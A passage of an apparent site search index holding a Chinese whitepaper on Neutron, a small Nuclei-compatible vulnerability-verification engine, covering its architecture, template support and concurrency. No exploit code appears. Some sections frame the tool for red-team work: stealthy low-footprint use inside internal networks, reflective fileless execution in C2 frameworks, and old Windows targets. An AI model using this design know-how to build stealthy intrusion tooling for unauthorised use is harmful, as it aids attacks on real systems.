\u4f9d\u8d56\u590d\u6742\uff1a\u5f15\u5165\u5927\u91cf\u7b2c\u4e09\u65b9\u4f9d\u8d56\uff0c\u7834\u574f\u4e86\u5de5\u5177\u7684\u72ec\u7acb\u6027 - \u517c\u5bb9\u6027\u4e0b\u964d\uff1a\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u4e0d\u65ad\u63d0\u9ad8\uff0c\u96be\u4ee5\u5728\u65e7\u7248\u672c\u7cfb\u7edf\u8fd0\u884c - \u6027\u80fd\u4e0b\u964d\uff1a\u529f\u80fd\u81a8\u80c0\u5bfc\u81f4\u542f\u52a8\u6162\u3001\u5185\u5b58\u5360\u7528\u9ad8 - \u7a33\u5b9a\u6027\u95ee\u9898\uff1a\u90e8\u5206POC\u56e0\u5f15\u64ce\u66f4\u65b0\u800c\u5931\u6548</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7279\u6b8a\u573a\u666f\u7684\u8feb\u5207\u9700\u6c42","title":"\u7279\u6b8a\u573a\u666f\u7684\u8feb\u5207\u9700\u6c42","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5185\u7f51\u6e17\u900f\u573a\u666f","title":"\u5185\u7f51\u6e17\u900f\u573a\u666f","text":"<ul> <li>\u6587\u4ef6\u4f20\u8f93\u9650\u5236\uff1a\u5185\u7f51\u73af\u5883\u5bf9\u6587\u4ef6\u5927\u5c0f\u6709\u4e25\u683c\u9650\u5236</li> <li>\u7cfb\u7edf\u7248\u672c\u591a\u6837\uff1a\u53ef\u80fd\u9047\u5230Windows XP\u3001Windows 2003\u7b49\u8001\u65e7\u7cfb\u7edf</li> <li>\u8d44\u6e90\u7ea6\u675f\uff1a\u76ee\u6807\u7cfb\u7edf\u53ef\u80fd\u5185\u5b58\u548cCPU\u8d44\u6e90\u6709\u9650</li> <li>\u9690\u853d\u6027\u8981\u6c42\uff1a\u9700\u8981\u5c3d\u53ef\u80fd\u5c0f\u7684\u5de5\u5177\u4f53\u79ef\u548c\u7cfb\u7edf\u5f71\u54cd</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u81ea\u52a8\u5316\u96c6\u6210\u573a\u666f","title":"\u81ea\u52a8\u5316\u96c6\u6210\u573a\u666f","text":"<ul> <li>\u5bb9\u5668\u5316\u90e8\u7f72\uff1a\u9700\u8981\u8f7b\u91cf\u7ea7\u955c\u50cf\u51cf\u5c11\u8d44\u6e90\u6d88\u8017</li> <li>CI/CD\u96c6\u6210\uff1a\u8981\u6c42\u5feb\u901f\u542f\u52a8\u548c\u6267\u884c</li> <li>\u5206\u5e03\u5f0f\u67b6\u6784\uff1a\u9700\u8981\u5728\u591a\u4e2a\u8282\u70b9\u95f4\u5feb\u901f\u5206\u53d1\u548c\u90e8\u7f72</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5d4c\u5165\u5f0f\u96c6\u6210\u573a\u666f","title":"\u5d4c\u5165\u5f0f\u96c6\u6210\u573a\u666f","text":"<ul> <li>SDK\u96c6\u6210\uff1a\u4f5c\u4e3a\u5176\u4ed6\u5de5\u5177\u7684\u7ec4\u4ef6\u8fdb\u884c\u96c6\u6210</li> <li>\u53cd\u5c04\u52a0\u8f7d\uff1a\u5728C2\u6846\u67b6\u4e2d\u8fdb\u884c\u65e0\u6587\u4ef6\u6267\u884c</li> <li>\u79fb\u52a8\u8bbe\u5907\uff1a\u5728ARM\u7b49\u4f4e\u529f\u8017\u8bbe\u5907\u4e0a\u8fd0\u884c</li> </ul> <p>Neutron \u6b63\u662f\u4e3a\u89e3\u51b3\u8fd9\u4e9b\u75db\u70b9\u800c\u8bbe\u8ba1\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u67b6\u6784","title":"\u6280\u672f\u67b6\u6784","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u8bbe\u8ba1\u7406\u5ff5","title":"\u8bbe\u8ba1\u7406\u5ff5","text":"<p>Neutron \u7684\u8bbe\u8ba1\u56f4\u7ed5\u4e09\u5927\u6838\u5fc3\u7406\u5ff5\uff1a</p> <ol> <li> <p>\u8f7b\u91cf\u5316\u4f18\u5148    \u901a\u8fc7\u7cbe\u786e\u7684\u529f\u80fd\u88c1\u526a\u548c\u4ee3\u7801\u4f18\u5316\uff0c\u5728\u4fdd\u6301\u6838\u5fc3\u529f\u80fd\u7684\u540c\u65f6\u5b9e\u73b0\u6781\u81f4\u7684\u8f7b\u91cf\u5316\uff0c\u786e\u4fdd\u5728\u5404\u79cd\u8d44\u6e90\u53d7\u9650\u73af\u5883\u4e2d\u7684\u53ef\u7528\u6027\u3002</p> </li> <li> <p>\u65e0\u635f\u517c\u5bb9    \u6700\u5927\u7a0b\u5ea6\u517c\u5bb9Nuclei v2.x\u7684YAML\u6a21\u677f\u683c\u5f0f\uff0c\u786e\u4fdd\u7528\u6237\u80fd\u591f\u65e0\u7f1d\u8fc1\u79fb\u73b0\u6709POC\u8d44\u6e90\uff0c\u964d\u4f4e\u8fc1\u79fb\u6210\u672c\u3002</p> </li> <li> <p>\u9ad8\u5ea6\u96c6\u6210    \u8bbe\u8ba1\u4e3a\u53ef\u5d4c\u5165\u7684\u5e93\uff0c\u652f\u6301\u4f5c\u4e3a\u7ec4\u4ef6\u96c6\u6210\u5230\u5176\u4ed6\u5b89\u5168\u5de5\u5177\u4e2d\uff0c\u63d0\u4f9b\u7075\u6d3b\u7684\u90e8\u7f72\u548c\u4f7f\u7528\u65b9\u5f0f\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u67b6\u6784\u8bbe\u8ba1","title":"\u67b6\u6784\u8bbe\u8ba1","text":"<p>Neutron \u91c7\u7528\u6781\u7b80\u4e3b\u4e49\u7684\u67b6\u6784\u8bbe\u8ba1\uff0c\u6838\u5fc3\u7ec4\u4ef6\u5305\u62ec\uff1a</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u5f15\u64ce\u5c42","title":"\u6838\u5fc3\u5f15\u64ce\u5c42","text":"<p>Neutron\u7684\u6838\u5fc3\u5f15\u64ce\u5c42\u4f53\u73b0\u4e86\u5bf9Nuclei\u5f15\u64ce\u7cbe\u534e\u7684\u6df1\u523b\u7406\u89e3\u548c\u521b\u65b0\u91cd\u6784\u3002YAML\u89e3\u6790\u5668\u91c7\u7528\u4e86\u6d41\u5f0f\u89e3\u6790\u6280\u672f\uff0c\u76f8\u6bd4\u4f20\u7edf\u7684DOM\u89e3\u6790\u65b9\u5f0f\uff0c\u5728\u5904\u7406\u5927\u578b\u6a21\u677f\u6587\u4ef6\u65f6\u5185\u5b58\u5360\u7528\u964d\u4f4e\u4e8680%\u4ee5\u4e0a\u3002HTTP\u5f15\u64ce\u91cd\u65b0\u8bbe\u8ba1\u4e86\u8bf7\u6c42\u751f\u6210\u548c\u54cd\u5e94\u5904\u7406\u673a\u5236\uff0c\u901a\u8fc7\u8fde\u63a5\u6c60\u590d\u7528\u3001\u8bf7\u6c42\u7ba1\u9053\u5316\u3001\u54cd\u5e94\u6d41\u5f0f\u5904\u7406\u7b49\u6280\u672f\uff0c\u5728\u4fdd\u6301\u5b8c\u6574\u529f\u80fd\u7684\u540c\u65f6\u5b9e\u73b0\u4e86\u6027\u80fd\u7684\u5927\u5e45\u63d0\u5347\u3002TCP\u5f15\u64ce\u5219\u4e13\u95e8\u9488\u5bf9\u670d\u52a1\u6307\u7eb9\u8bc6\u522b\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u652f\u6301\u539f\u59cb\u5957\u63a5\u5b57\u64cd\u4f5c\u3001\u81ea\u5b9a\u4e49\u534f\u8bae\u89e3\u6790\u3001\u4e8c\u8fdb\u5236\u6570\u636e\u5904\u7406\u7b49\u9ad8\u7ea7\u529f\u80fd\u3002DSL\u5904\u7406\u5668\u662f\u7cfb\u7edf\u7684\u667a\u80fd\u6838\u5fc3\uff0c\u901a\u8fc7\u91cd\u65b0\u5b9e\u73b0DSL\u5f15\u64ce\uff0c\u4e0d\u4ec5\u4fdd\u6301\u4e86\u5bf9Nuclei v2.x\u7684\u9ad8\u5ea6\u517c\u5bb9\u6027\uff0c\u8fd8\u5728\u5173\u952e\u529f\u80fd\u4e0a\u8fdb\u884c\u4e86\u6027\u80fd\u4f18\u5316\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6a21\u677f\u7ba1\u7406\u5c42","title":"\u6a21\u677f\u7ba1\u7406\u5c42","text":"<p>\u6a21\u677f\u7ba1\u7406\u5c42\u627f\u62c5\u7740POC\u6a21\u677f\u7684\u52a0\u8f7d\u3001\u9a8c\u8bc1\u3001\u7f13\u5b58\u7b49\u5173\u952e\u529f\u80fd\u3002\u6a21\u677f\u52a0\u8f7d\u5668\u652f\u6301\u591a\u79cd\u52a0\u8f7d\u65b9\u5f0f\uff0c\u65e2\u80fd\u4ece\u6587\u4ef6\u7cfb\u7edf\u52a8\u6001\u52a0\u8f7d\u6a21\u677f\uff0c\u4e5f\u652f\u6301\u5c06\u6a21\u677f\u7f16\u8bd1\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u5b9e\u73b0\u771f\u6b63\u7684\u96f6\u4f9d\u8d56\u90e8\u7f72\u3002\u89c4\u5219\u7f13\u5b58\u7cfb\u7edf\u91c7\u7528\u4e86\u667a\u80fd\u9884\u70ed\u7b56\u7565\uff0c\u6839\u636e\u4f7f\u7528\u9891\u7387\u548c\u76ee\u6807\u7279\u5f81\u81ea\u52a8\u9884\u52a0\u8f7d\u6700\u53ef\u80fd\u7528\u5230\u7684\u6a21\u677f\uff0c\u5c06\u9996\u6b21\u6267\u884c\u7684\u5ef6\u8fdf\u964d\u4f4e\u5230\u6beb\u79d2\u7ea7\u3002\u6761\u4ef6\u5339\u914d\u5668\u901a\u8fc7\u4f18\u5316\u5339\u914d\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\uff0c\u5c06\u590d\u6742\u6761\u4ef6\u7684\u5339\u914d\u65f6\u95f4\u4ece\u7ebf\u6027\u65f6\u95f4\u4f18\u5316\u5230\u8fd1\u4f3c\u5e38\u6570\u65f6\u95f4\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6267\u884c\u63a7\u5236\u5c42","title":"\u6267\u884c\u63a7\u5236\u5c42","text":"<p>\u6267\u884c\u63a7\u5236\u5c42\u8d1f\u8d23\u534f\u8c03\u6574\u4e2a\u6f0f\u6d1e\u9a8c\u8bc1\u8fc7\u7a0b\u7684\u6267\u884c\u6d41\u7a0b\u3002\u5e76\u53d1\u63a7\u5236\u6a21\u5757\u91c7\u7528\u4e86\u81ea\u9002\u5e94\u5e76\u53d1\u7b56\u7565\uff0c\u80fd\u591f\u6839\u636e\u76ee\u6807\u7cfb\u7edf\u7684\u54cd\u5e94\u7279\u5f81\u52a8\u6001\u8c03\u6574\u5e76\u53d1\u6570\u91cf\uff0c\u907f\u514d\u56e0\u8fc7\u5ea6\u5e76\u53d1\u5bfc\u81f4\u7684\u76ee\u6807\u7cfb\u7edf\u538b\u529b\u548c\u68c0\u6d4b\u51c6\u786e\u6027\u4e0b\u964d\u3002\u8bf7\u6c42\u8c03\u5ea6\u5668\u5b9e\u73b0\u4e86\u57fa\u4e8e\u4f18\u5148\u7ea7\u7684\u667a\u80fd\u8c03\u5ea6\u7b97\u6cd5\uff0c\u9ad8\u5371\u6f0f\u6d1e\u548c\u9ad8\u6210\u529f\u7387\u7684POC\u4f1a\u88ab\u4f18\u5148\u6267\u884c\uff0c\u63d0\u5347\u4e86\u6574\u4f53\u68c0\u6d4b\u6548\u7387\u3002\u7ed3\u679c\u805a\u5408\u6a21\u5757\u8d1f\u8d23\u6536\u96c6\u3001\u53bb\u91cd\u3001\u683c\u5f0f\u5316\u68c0\u6d4b\u7ed3\u679c\uff0c\u652f\u6301\u591a\u79cd\u8f93\u51fa\u683c\u5f0f\u548c\u81ea\u5b9a\u4e49\u62a5\u544a\u6a21\u677f\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u96c6\u6210\u63a5\u53e3\u5c42","title":"\u96c6\u6210\u63a5\u53e3\u5c42","text":"<p>\u96c6\u6210\u63a5\u53e3\u5c42\u4e3a\u4e0d\u540c\u7684\u4f7f\u7528\u573a\u666f\u63d0\u4f9b\u4e86\u7075\u6d3b\u7684\u63a5\u5165\u65b9\u5f0f\u3002Go SDK\u91c7\u7528\u4e86\u9762\u5411\u63a5\u53e3\u7684\u8bbe\u8ba1\u7406\u5ff5\uff0c\u901a\u8fc7\u7b80\u6d01\u7684API\u66b4\u9732\u6838\u5fc3\u529f\u80fd\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7\u51e0\u884c\u4ee3\u7801\u5c31\u4e3a\u73b0\u6709\u5de5\u5177\u96c6\u6210\u5f3a\u5927\u7684\u6f0f\u6d1e\u9a8c\u8bc1\u80fd\u529b\u3002HTTP API\u9075\u5faaRESTful\u8bbe\u8ba1\u539f\u5219\uff0c\u652f\u6301\u8de8\u8bed\u8a00\u8c03\u7528\u548c\u5fae\u670d\u52a1\u67b6\u6784\u96c6\u6210\u3002CLI\u5de5\u5177\u5219\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684\u547d\u4ee4\u884c\u754c\u9762\uff0c\u652f\u6301\u6279\u91cf\u5904\u7406\u3001\u914d\u7f6e\u7ba1\u7406\u3001\u7ed3\u679c\u5bfc\u51fa\u7b49\u529f\u80fd\uff0c\u6ee1\u8db3\u4e0d\u540c\u7528\u6237\u7684\u64cd\u4f5c\u4e60\u60ef\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u7279\u6027","title":"\u6280\u672f\u7279\u6027","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6781\u81f4\u8f7b\u91cf\u5316\u8bbe\u8ba1\u7406\u5ff5","title":"\u6781\u81f4\u8f7b\u91cf\u5316\u8bbe\u8ba1\u7406\u5ff5","text":"<p>Neutron\u7684\u8f7b\u91cf\u5316\u8bbe\u8ba1\u9075\u5faa\"\u5220\u7e41\u5c31\u7b80\"\u7684\u54f2\u5b66\u601d\u60f3\uff0c\u901a\u8fc7\u6df1\u5ea6\u5206\u6790Nuclei\u7684\u529f\u80fd\u4f7f\u7528\u9891\u7387\u548c\u6027\u80fd\u74f6\u9888\uff0c\u7cbe\u786e\u5730\u4fdd\u7559\u4e86\u6838\u5fc3\u529f\u80fd\u800c\u5265\u79bb\u4e86\u5197\u4f59\u7ec4\u4ef6\u3002\u96f6\u4f9d\u8d56\u7684\u5b9e\u73b0\u5e76\u975e\u7b80\u5355\u7684\u5e93\u66ff\u6362\uff0c\u800c\u662f\u91cd\u65b0\u5b9e\u73b0\u4e86\u6240\u6709\u5fc5\u8981\u7684\u5e95\u5c42\u529f\u80fd\uff0c\u786e\u4fdd\u5728\u4efb\u4f55\u73af\u5883\u4e0b\u90fd\u80fd\u7a33\u5b9a\u8fd0\u884c\u3002\u4f53\u79ef\u4f18\u5316\u91c7\u7528\u4e86\u591a\u9879\u7f16\u8bd1\u5668\u4f18\u5316\u6280\u672f\uff0c\u5305\u62ec\u6b7b\u4ee3\u7801\u6d88\u9664\u3001\u7b26\u53f7\u8868\u538b\u7f29\u3001\u8d44\u6e90\u5185\u8054\u7b49\uff0c\u5c06\u6700\u7ec8\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u63a7\u5236\u5728\u6700\u5c0f\u8303\u56f4\u5185\u3002\u8d44\u6e90\u4f18\u5316\u901a\u8fc7\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u5185\u5b58\u6c60\u3001\u5bf9\u8c61\u590d\u7528\u3001\u60f0\u6027\u52a0\u8f7d\u7b49\u6280\u672f\uff0c\u5c06\u8fd0\u884c\u65f6\u7684\u8d44\u6e90\u5360\u7528\u964d\u5230\u6700\u4f4e\u3002\u542f\u52a8\u4f18\u5316\u5219\u901a\u8fc7\u9884\u7f16\u8bd1\u3001\u7f13\u5b58\u9884\u70ed\u3001\u6a21\u5757\u6309\u9700\u52a0\u8f7d\u7b49\u7b56\u7565\uff0c\u5b9e\u73b0\u4e86\u771f\u6b63\u7684\u5373\u5f00\u5373\u7528\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5e7f\u6cdb\u517c\u5bb9\u6027\u4fdd\u8bc1","title":"\u5e7f\u6cdb\u517c\u5bb9\u6027\u4fdd\u8bc1","text":"<p>\u9ad8\u517c\u5bb9\u6027\u662fNeutron\u8bbe\u8ba1\u7684\u53e6\u4e00\u4e2a\u6838\u5fc3\u76ee\u6807\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u7ea2\u961f\u548c\u6e17\u900f\u6d4b\u8bd5\u573a\u666f\u4e2d\u53ef\u80fd\u9047\u5230\u7684\u5404\u79cd\u8001\u65e7\u7cfb\u7edf\u73af\u5883\u3002\u7cfb\u7edf\u517c\u5bb9\u6027\u7684\u5b9e\u73b0\u901a\u8fc7\u4f7f\u7528\u4f4e\u7248\u672c\u7684\u7cfb\u7edf\u8c03\u7528\u3001\u907f\u514d\u65b0\u7279\u6027\u4f9d\u8d56\u3001\u81ea\u5b9e\u73b0\u5173\u952e\u529f\u80fd\u7b49\u65b9\u5f0f\uff0c\u786e\u4fdd\u80fd\u5728Windows XP/2003\u8fd9\u6837\u7684\u8001\u65e7\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6b63\u5e38\u8fd0\u884c\u3002\u67b6\u6784\u517c\u5bb9\u6027\u901a\u8fc7\u6761\u4ef6\u7f16\u8bd1\u548c\u8fd0\u884c\u65f6\u68c0\u6d4b\u6280\u672f\uff0c\u4e3a\u4e0d\u540c\u7684CPU\u67b6\u6784\u63d0\u4f9b\u4f18\u5316\u7684\u6267\u884c\u8def\u5f84\u3002\u6a21\u677f\u517c\u5bb9\u6027\u5219\u901a\u8fc7\u6df1\u5ea6\u5206\u6790Nuclei v2.x\u7684\u6a21\u677f\u683c\u5f0f\u548cDSL\u8bed\u6cd5\uff0c\u5b9e\u73b0\u4e86\u9ad8\u8fbe90%\u4ee5\u4e0a\u7684\u517c\u5bb9\u7387\uff0c\u786e\u4fdd\u7528\u6237\u7684\u73b0\u6709\u6295\u8d44\u5f97\u5230\u6700\u5927\u4fdd\u62a4\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u6027\u80fd\u6280\u672f\u67b6\u6784","title":"\u9ad8\u6027\u80fd\u6280\u672f\u67b6\u6784","text":"<p>Neutron\u7684\u9ad8\u6027\u80fd\u8868\u73b0\u6e90\u4e8e\u5bf9\u6027\u80fd\u4f18\u5316\u7684\u7cfb\u7edf\u6027\u601d\u8003\u548c\u5b9e\u8df5\u3002\u5e76\u53d1\u4f18\u5316\u4e0d\u4ec5\u4ec5\u662f\u589e\u52a0\u7ebf\u7a0b\u6570\uff0c\u800c\u662f\u901a\u8fc7\u534f\u7a0b\u6c60\u3001\u4efb\u52a1\u961f\u5217\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u6280\u672f\u5b9e\u73b0\u667a\u80fd\u7684\u5e76\u53d1\u63a7\u5236\uff0c\u907f\u514d\u4e86\u4f20\u7edf\u591a\u7ebf\u7a0b\u5e26\u6765\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u5f00\u9500\u3002\u5185\u5b58\u4f18\u5316\u91c7\u7528\u4e86\u96f6\u62f7\u8d1d\u6280\u672f\u3001\u5185\u5b58\u6c60\u7ba1\u7406\u3001\u5783\u573e\u56de\u6536\u4f18\u5316\u7b49\u7b56\u7565\uff0c\u5c06\u5185\u5b58\u4f7f\u7528\u6548\u7387\u63d0\u5347\u5230\u6781\u81f4\u3002\u7f51\u7edc\u4f18\u5316\u901a\u8fc7\u8fde\u63a5\u590d\u7528\u3001\u8bf7\u6c42\u7ba1\u9053\u5316\u3001\u54cd\u5e94\u7f13\u5b58\u7b49\u6280\u672f\uff0c\u663e\u8457\u51cf\u5c11\u4e86\u7f51\u7edcIO\u7684\u5ef6\u8fdf\u548c\u5f00\u9500\u3002\u8fd9\u4e9b\u4f18\u5316\u63aa\u65bd\u534f\u540c\u5de5\u4f5c\uff0c\u4f7f\u5f97Neutron\u5728\u8d44\u6e90\u53d7\u9650\u7684\u73af\u5883\u4e2d\u4ecd\u80fd\u4fdd\u6301\u4f18\u5f02\u7684\u6027\u80fd\u8868\u73b0\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u529f\u80fd","title":"\u6838\u5fc3\u529f\u80fd","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u8f7b\u91cf\u7ea7poc\u5f15\u64ce","title":"\u8f7b\u91cf\u7ea7POC\u5f15\u64ce","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5","title":"\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5","text":"<p>Neutron\u7684\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\"\u8f7b\u91cf\u800c\u4e0d\u5931\u5f3a\u5927\"\u3002\u901a\u8fc7\u7cbe\u786e\u7684\u529f\u80fd\u88c1\u526a\u548c\u67b6\u6784\u4f18\u5316\uff0c\u5728\u4fdd\u6301\u5f3a\u5927\u6f0f\u6d1e\u68c0\u6d4b\u80fd\u529b\u7684\u540c\u65f6\uff0c\u5b9e\u73b0\u4e86\u6781\u81f4\u7684\u8f7b\u91cf\u5316\uff1a</p> <p>\u4f53\u79ef\u4f18\u5316\uff1a - \u4eceNuclei v3\u768445MB\u538b\u7f29\u52303MB\uff0c\u51cf\u5c11\u4e8693%\u7684\u4f53\u79ef - \u5728\u6781\u9650\u914d\u7f6e\u4e0b\u53ef\u538b\u7f29\u81f32MB\u4ee5\u4e0b - \u76f8\u6bd4\u539f\u7248Nuclei\u51cf\u5c11\u4e86\u6570\u767e\u4e2a\u4f9d\u8d56\u5e93</p> <p>\u6027\u80fd\u63d0\u5347\uff1a - \u542f\u52a8\u65f6\u95f4\u4ece5-8\u79d2\u4f18\u5316\u81f31\u79d2\u4ee5\u5185 - \u5185\u5b58\u5360\u7528\u964d\u4f4e90%\uff0c\u9002\u7528\u4e8e\u8d44\u6e90\u53d7\u9650\u73af\u5883 - \u5904\u7406\u901f\u5ea6\u63d0\u534750%\uff0c\u540c\u7b49\u786c\u4ef6\u4e0b\u68c0\u6d4b\u66f4\u591a\u76ee\u6807</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u652f\u6301\u7684\u534f\u8bae\u7c7b\u578b","title":"\u652f\u6301\u7684\u534f\u8bae\u7c7b\u578b","text":"<ul> <li>HTTP/HTTPS\uff1a\u5b8c\u6574\u652f\u6301HTTP\u534f\u8bae\u7684\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u6db5\u76d6Web\u5e94\u7528\u7684\u5404\u79cd\u653b\u51fb\u5411\u91cf</li> <li>TCP\uff1a\u539f\u59cbTCP socket\u7684\u670d\u52a1\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u652f\u6301\u6570\u636e\u5e93\u3001\u4e2d\u95f4\u4ef6\u7b49\u670d\u52a1</li> <li>\u6269\u5c55\u534f\u8bae\uff1a\u901a\u8fc7\u63d2\u4ef6\u65b9\u5f0f\u652f\u6301\u5176\u4ed6\u534f\u8bae\uff0c\u4fdd\u6301\u67b6\u6784\u7684\u53ef\u6269\u5c55\u6027</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#yaml\u6a21\u677f\u517c\u5bb9\u6027","title":"YAML\u6a21\u677f\u517c\u5bb9\u6027","text":"<p>Neutron \u652f\u6301Nuclei v2.x\u7684\u6838\u5fc3\u529f\u80fd\uff1a</p> <p>\u5b8c\u5168\u652f\u6301\u7684\u529f\u80fd\uff1a - \u2705 HTTP/TCP\u8bf7\u6c42\u6a21\u677f - \u2705 \u5339\u914d\u5668\uff08Matchers\uff09\uff1aword\u3001regex\u3001status\u3001size\u3001dsl - \u2705 \u63d0\u53d6\u5668\uff08Extractors\uff09\uff1aregex\u3001xpath\u3001json - \u2705 \u53d8\u91cf\uff08Variables\uff09\uff1a\u52a8\u6001\u53d8\u91cf\u548cpayload - \u2705 DSL\u51fd\u6570\uff1a80%\u4ee5\u4e0a\u7684\u5185\u7f6e\u51fd\u6570 - \u2705 \u6761\u4ef6\u5339\u914d\uff1a\u590d\u6742\u7684\u903b\u8f91\u6761\u4ef6\u7ec4\u5408 - \u2705 Cookie\u91cd\u7528\uff1a\u4f1a\u8bdd\u4fdd\u6301\u529f\u80fd - \u2705 HTTP\u91cd\u5b9a\u5411\uff1a\u81ea\u52a8\u8ddf\u968f\u91cd\u5b9a\u5411</p> <p>\u7b80\u5316\u652f\u6301\u7684\u529f\u80fd\uff1a - \ud83d\udd04 Workflow\uff1a\u901a\u8fc7chain\u7b80\u5316\u5b9e\u73b0 - \ud83d\udd04 \u8bf7\u6c42\u6ce8\u89e3\uff1a\u57fa\u7840\u6ce8\u89e3\u652f\u6301</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u667a\u80fdpoc\u8c03\u5ea6\u4e0e\u9ad8\u5e76\u53d1\u652f\u6301","title":"\u667a\u80fdPOC\u8c03\u5ea6\u4e0e\u9ad8\u5e76\u53d1\u652f\u6301","text":"<p>Neutron\u5b9e\u73b0\u4e86\u57fa\u4e8e\u6307\u7eb9\u8bc6\u522b\u7ed3\u679c\u7684\u667a\u80fdPOC\u9009\u62e9\u673a\u5236\uff0c\u8fd9\u662f\u5176\u76f8\u5bf9\u4e8e\u4f20\u7edf\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u7684\u91cd\u8981\u4f18\u52bf\u3002\u7cfb\u7edf\u6839\u636eFingers\u7b49\u6307\u7eb9\u8bc6\u522b\u5f15\u64ce\u7684\u8f93\u51fa\u7ed3\u679c\uff0c\u81ea\u52a8\u5339\u914d\u76f8\u5173\u7684POC\u6a21\u677f\uff0c\u907f\u514d\u76f2\u76ee\u53d1\u9001\u6240\u6709POC\u800c\u9020\u6210\u7684\u6548\u7387\u4f4e\u4e0b\u548c\u76ee\u6807\u7cfb\u7edf\u538b\u529b\u3002\u901a\u8fc7tag-based\u7684POC\u5206\u7c7b\u548c\u7b5b\u9009\u673a\u5236\uff0c\u7cfb\u7edf\u80fd\u591f\u7cbe\u786e\u5b9a\u4f4d\u6700\u6709\u53ef\u80fd\u6210\u529f\u7684\u6f0f\u6d1e\u68c0\u6d4b\u8def\u5f84\u3002</p> <p>\u9ad8\u5e76\u53d1\u67b6\u6784\u8bbe\u8ba1\uff1aNeutron\u652f\u6301\u5206\u5e03\u5f0f\u67b6\u6784\u7684\u9ad8\u5e76\u53d1\u626b\u63cf\uff0c\u9ed8\u8ba4\u914d\u7f6e\u652f\u63014000\u7ebf\u7a0b\u7684\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002\u7cfb\u7edf\u91c7\u7528\u667a\u80fd\u7684\u7ebf\u7a0b\u6c60\u7ba1\u7406\u3001\u57fa\u4e8e\u76ee\u6807\u7279\u5f81\u7684\u5e76\u53d1\u9650\u5236\u3001\u81ea\u9002\u5e94\u7684\u8bf7\u6c42\u9891\u7387\u63a7\u5236\u7b49\u6280\u672f\uff0c\u786e\u4fdd\u5728\u5927\u89c4\u6a21\u626b\u63cf\u573a\u666f\u4e0b\u7684\u7a33\u5b9a\u6027\u548c\u6548\u7387\u3002</p> 